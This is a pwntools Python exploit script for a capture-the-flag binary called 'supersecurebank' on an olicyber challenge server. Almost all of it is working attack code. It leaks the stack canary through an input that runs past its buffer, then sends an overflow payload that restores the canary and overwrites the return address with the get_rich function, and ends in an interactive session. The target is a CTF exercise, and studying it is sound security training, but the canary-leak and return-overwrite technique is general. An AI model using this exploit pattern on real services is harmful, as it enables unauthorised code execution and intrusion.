#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF(args.EXE or 'supersecurebank')

host = args.HOST or 'super-secure-bank.challs.olicyber.it'
port = int(args.PORT or 38080)


def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendlineafter(b': ', b'1')
io.sendlineafter(b': ', b'12')
io.sendlineafter(b': ', b'1' * 8)

out = io.recvlines(2)
canary = u64(b'\x00' + out[1][:7])
payload = b'U' * 0x18 + p64(canary) + b'\x00' * 8 + p64(exe.sym.get_rich)

io.sendlineafter(b': ', payload)

io.interactive()

